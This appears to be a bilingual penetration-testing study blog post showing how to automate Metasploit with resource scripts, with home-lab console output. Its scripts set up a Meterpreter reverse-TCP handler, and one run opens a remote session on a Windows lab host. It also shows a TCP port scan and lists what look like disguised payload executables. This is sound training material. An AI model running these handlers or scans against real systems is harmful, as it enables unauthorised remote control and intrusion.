---
layout: post
title: "Automating Metasploit With Resource Scripts"
date: "2023-01-22"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - The Metasploit Framework (MSF)
---

# Automating Metasploit With Resource Scripts
## Metasploit Resource Scripts
Metasploit resource scripts are a great feature of MSF that allow you to automate repetitive tasks and commands.

They operate similarly to batch scripts, whereby, you can specify a set of Msfconsole commands that you want to execute sequentially.

You can load the script with Msfconsole and automate the execution of the commands you specified in the resource script.

We can use resource scripts to automate various tasks like setting up multi handlers as well as loading and executing payloads.

# 使用资源脚本自动化 Metasploit
## Metasploit 资源脚本
Metasploit 资源脚本是 MSF 的一项重要功能，可让您自动执行重复性任务和命令。

它们的操作类似于批处理脚本，因此您可以指定一组要按顺序执行的 Msfconsole 命令。

您可以使用 Msfconsole 加载脚本并自动执行您在资源脚本中指定的命令。

我们可以使用资源脚本来自动执行各种任务，例如设置多处理程序以及加载和执行有效负载。

# Demo: Automating Metasploit With Resource Scripts（演示：使用资源脚本自动化 Metasploit）
We have a series or a collection of resource scripts that come pre-packaged with Kali Linux.

```
ls -al /usr/share/metasploit-framework/scripts/resource/
vim /usr/share/metasploit-framework/scripts/resource/auto_brute.rc
:q!
```

Try to automate the process of setting up a handler for the payloads that we generated.

```
cd Windows_Payloads/
ls
```

What you would typically do manually is say:

```
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.10.5
set LPORT 1234
run
exit
```

`run -j`: run in the background as a job.

What you can do in replacement of this is set up an RC script.

```
vim handler.rc
```

```
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.10.5
set LPORT 1234
run
:wq
```

The important thing to note here is that you need to specify the commands sequentially, from the first command all the way to the last command, with the first command being at the topmost and the last command being at the end of the script.

In order to load it and actually see how this works:

```
msfconsole -r handler.rc
```

Make sure that we have the module name or have it set correctly.

```
msfconsole
search portscan
use auxiliary/scanner/portscan/tcp
show options
exit
```

We can automate this process:

```
vim portscan.rc
```

```
use auxiliary/scanner/portscan/tcp
set RHOST 10.10.10.7
run
```

This process will automate the port scanneing process.

```
msfconsole -r portscan.rc
exit
```

Check the status of the database.

```
vim db_status.rc
```

```
db_status
workspace
workspace -a Test
:wq
```

```
msfconsole -r db_status.rc
workspace -d Test
exit
```

Load up resource scripts from within the MSFconsole. 

```
msfconsole
```

How to load up the resource scripts directly from within MSF console.

```
msf6 > resource ~/Desktop/Windows_Payloads/handler.rc
exit
```

Create a resource script automatically from within MSF console. 

I can type in the commands that I want to be in a resource script and then export those commands into a resource script.

```
msfconsole
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.10.7
run
```

I can export all of the commands that I typed in. I can export all of these into a resource script.

Specify the path where you want to save the resource script.

```
makerc ~/Desktop/portscan.rc
exit
```

MSF console was started as a root user. 

```
su root
```

```
cd /root/Desktop
ls
cat portscan.rc
```

The reason it output or saved it within the root users directory is because we didn't specify the entire path. So we should have specified the absolute path or the relative path to the actual directory where we wanted to save it.

We should have saved it under `/home/kali/Desktop`. Because MSF console requires root privileges in certain scenarios, it saved it under the `/root/Desktop`.

That is the process of creating Metasploit RC scripts to automate repetitive tasks or commands that you don't want to keep on running. You can customize them and utilize pretty much all MSF console commands, as long as they make sense sequentially.

# Home Lab
Kali: 192.168.248.148

Windows 7 SP1: 192.168.248.150

```
┌──(root㉿kali)-[~]
└─# ls -al /usr/share/metasploit-framework/scripts/resource/
total 160
drwxr-xr-x 2 root root  4096 Nov 24 23:03 .
drwxr-xr-x 5 root root  4096 Nov 24 23:03 ..
-rw-r--r-- 1 root root  7270 Nov 10 12:07 auto_brute.rc
-rw-r--r-- 1 root root  2203 Nov 10 12:07 autocrawler.rc
-rw-r--r-- 1 root root 11225 Nov 10 12:07 auto_cred_checker.rc
-rw-r--r-- 1 root root  6565 Nov 10 12:07 autoexploit.rc
-rw-r--r-- 1 root root  3422 Nov 10 12:07 auto_pass_the_hash.rc
-rw-r--r-- 1 root root   876 Nov 10 12:07 auto_win32_multihandler.rc
-rw-r--r-- 1 root root   155 Nov 10 12:07 bap_all.rc
-rw-r--r-- 1 root root   762 Nov 10 12:07 bap_dryrun_only.rc
-rw-r--r-- 1 root root   365 Nov 10 12:07 bap_firefox_only.rc
-rw-r--r-- 1 root root   358 Nov 10 12:07 bap_flash_only.rc
-rw-r--r-- 1 root root   354 Nov 10 12:07 bap_ie_only.rc
-rw-r--r-- 1 root root 20737 Nov 10 12:07 basic_discovery.rc
-rw-r--r-- 1 root root  4518 Nov 10 12:07 dev_checks.rc
-rw-r--r-- 1 root root  3358 Nov 10 12:07 fileformat_generator.rc
-rw-r--r-- 1 root root  1085 Nov 10 12:07 meterpreter_compatibility.rc
-rw-r--r-- 1 root root  1064 Nov 10 12:07 mssql_brute.rc
-rw-r--r-- 1 root root  4346 Nov 10 12:07 multi_post.rc
-rw-r--r-- 1 root root  1222 Nov 10 12:07 nessus_vulns_cleaner.rc
-rw-r--r-- 1 root root  1659 Nov 10 12:07 oracle_login.rc
-rw-r--r-- 1 root root   840 Nov 10 12:07 oracle_sids.rc
-rw-r--r-- 1 root root   490 Nov 10 12:07 oracle_tns.rc
-rw-r--r-- 1 root root   833 Nov 10 12:07 port_cleaner.rc
-rw-r--r-- 1 root root  2419 Nov 10 12:07 portscan.rc
-rw-r--r-- 1 root root  1251 Nov 10 12:07 run_all_post.rc
-rw-r--r-- 1 root root  3084 Nov 10 12:07 smb_checks.rc
-rw-r--r-- 1 root root  3837 Nov 10 12:07 smb_validate.rc
-rw-r--r-- 1 root root  2592 Nov 10 12:07 wmap_autotest.rc
```

```
┌──(root㉿kali)-[~/payloads/Windows_Payloads]
└─# ls
encodedx86.exe  payloadx64.exe  payloadx86.exe  winrar.exe  winrar-new.exe
```

```
┌──(root㉿kali)-[~/payloads/Windows_Payloads]
└─# vim handler.rc
```

```
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.248.148
set LPORT 1234
run
```

```
┌──(root㉿kali)-[~/payloads/Windows_Payloads]
└─# msfconsole -r handler.rc
[*] Processing handler.rc for ERB directives.
resource (handler.rc)> use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
resource (handler.rc)> set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
resource (handler.rc)> set LHOST 192.168.248.148
LHOST => 192.168.248.148
resource (handler.rc)> set LPORT 1234
LPORT => 1234
resource (handler.rc)> run
[*] Started reverse TCP handler on 192.168.248.148:1234 

```

```
┌──(root㉿kali)-[~/payloads/Windows_Payloads]
└─# msfconsole -q           
msf6 > search portscan

Matching Modules
================

   #  Name                                              Disclosure Date  Rank    Check  Description
   -  ----                                              ---------------  ----    -----  -----------
   0  auxiliary/scanner/portscan/ftpbounce                               normal  No     FTP Bounce Port Scanner
   1  auxiliary/scanner/natpmp/natpmp_portscan                           normal  No     NAT-PMP External Port Scanner
   2  auxiliary/scanner/sap/sap_router_portscanner                       normal  No     SAPRouter Port Scanner
   3  auxiliary/scanner/portscan/xmas                                    normal  No     TCP "XMas" Port Scanner
   4  auxiliary/scanner/portscan/ack                                     normal  No     TCP ACK Firewall Scanner
   5  auxiliary/scanner/portscan/tcp                                     normal  No     TCP Port Scanner
   6  auxiliary/scanner/portscan/syn                                     normal  No     TCP SYN Port Scanner
   7  auxiliary/scanner/http/wordpress_pingback_access                   normal  No     Wordpress Pingback Locator


Interact with a module by name or index. For example info 7, use 7 or use auxiliary/scanner/http/wordpress_pingback_access

msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > show options

Module options (auxiliary/scanner/portscan/tcp):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CONCURRENCY  10               yes       The number of concurrent ports to check per host
   DELAY        0                yes       The delay between connections, per thread, in milliseconds
   JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
   RHOSTS                        yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   THREADS      1                yes       The number of concurrent threads (max one per host)
   TIMEOUT      1000             yes       The socket connect timeout in milliseconds


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/portscan/tcp) > exit
```

```
┌──(root㉿kali)-[~/payloads/Windows_Payloads]
└─# vim portscan.rc
```

```
use auxiliary/scanner/portscan/tcp
set RHOST 192.168.248.150
run
```

```
┌──(root㉿kali)-[~/payloads/Windows_Payloads]
└─# msfconsole -r portscan.rc
[*] Processing portscan.rc for ERB directives.
resource (portscan.rc)> use auxiliary/scanner/portscan/tcp
resource (portscan.rc)> set RHOST 192.168.248.150
RHOST => 192.168.248.150
resource (portscan.rc)> run
[+] 192.168.248.150:      - 192.168.248.150:22 - TCP OPEN
[+] 192.168.248.150:      - 192.168.248.150:135 - TCP OPEN
[+] 192.168.248.150:      - 192.168.248.150:139 - TCP OPEN
[+] 192.168.248.150:      - 192.168.248.150:445 - TCP OPEN
[+] 192.168.248.150:      - 192.168.248.150:3389 - TCP OPEN
[+] 192.168.248.150:      - 192.168.248.150:5357 - TCP OPEN
[*] 192.168.248.150:      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/portscan/tcp) > exit
```

```
┌──(root㉿kali)-[~/payloads/Windows_Payloads]
└─# vim db_status.rc
```

```
db_status
workspace
workspace -a Test
```

```
┌──(root㉿kali)-[~/payloads/Windows_Payloads]
└─# msfconsole -q -r db_status.rc
[*] Processing db_status.rc for ERB directives.
resource (db_status.rc)> db_status
[*] Connected to msf. Connection type: postgresql.
resource (db_status.rc)> workspace
  MS3_Nessus
  MSF3
  PTA
* default
resource (db_status.rc)> workspace -a Test
[*] Added workspace: Test
[*] Workspace: Test
msf6 > workspace
  MS3_Nessus
  MSF3
  PTA
  default
* Test
msf6 > workspace -d Test
[*] Deleted workspace: Test
[*] Switched to workspace: default
msf6 > exit
```

```
┌──(root㉿kali)-[~/payloads/Windows_Payloads]
└─# msfconsole -q                
msf6 > resource ~/payloads/Windows_Payloads/handler.rc
[*] Processing /root/payloads/Windows_Payloads/handler.rc for ERB directives.
resource (/root/payloads/Windows_Payloads/handler.rc)> use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
resource (/root/payloads/Windows_Payloads/handler.rc)> set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
resource (/root/payloads/Windows_Payloads/handler.rc)> set LHOST 192.168.248.148
LHOST => 192.168.248.148
resource (/root/payloads/Windows_Payloads/handler.rc)> set LPORT 1234
LPORT => 1234
resource (/root/payloads/Windows_Payloads/handler.rc)> run

[*] Started reverse TCP handler on 192.168.248.148:1234 
[*] Sending stage (175686 bytes) to 192.168.248.150
[*] Meterpreter session 1 opened (192.168.248.148:1234 -> 192.168.248.150:49209) at 2023-01-22 09:19:00 -0500

meterpreter > exit
[*] Shutting down Meterpreter...

[*] 192.168.248.150 - Meterpreter session 1 closed.  Reason: User exit
msf6 exploit(multi/handler) > exit
```

Specify the absolute path here.

```
┌──(root㉿kali)-[~/payloads/Windows_Payloads]
└─# msfconsole -q
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.168.248.150
RHOSTS => 192.168.248.150
msf6 auxiliary(scanner/portscan/tcp) > run

[+] 192.168.248.150:      - 192.168.248.150:22 - TCP OPEN
[+] 192.168.248.150:      - 192.168.248.150:135 - TCP OPEN
[+] 192.168.248.150:      - 192.168.248.150:139 - TCP OPEN
[+] 192.168.248.150:      - 192.168.248.150:445 - TCP OPEN
[+] 192.168.248.150:      - 192.168.248.150:3389 - TCP OPEN
[+] 192.168.248.150:      - 192.168.248.150:5357 - TCP OPEN
[*] 192.168.248.150:      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/portscan/tcp) > makerc /root/payloads/Windows_Payloads/portscan2.rc
[*] Saving last 3 commands to /root/payloads/Windows_Payloads/portscan2.rc ...
msf6 auxiliary(scanner/portscan/tcp) > exit
```